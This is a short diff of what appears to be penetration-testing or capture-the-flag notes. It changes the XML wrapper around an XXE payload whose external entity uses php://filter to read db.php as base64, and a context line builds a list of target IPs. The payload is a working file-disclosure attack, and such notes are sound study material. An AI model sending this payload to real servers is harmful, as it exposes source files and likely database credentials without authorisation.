@@ -246,12 +246,9 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 ```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
-                <bugreport>
-                <title>&xxe;</title>
-                <cwe>1234</cwe>
-                <cvss>1234</cvss>
-                <reward>1234</reward>
-                </bugreport>
+                <foo>
+                <something>&xxe;</something>
+                </foo>
 ```
 
 ---
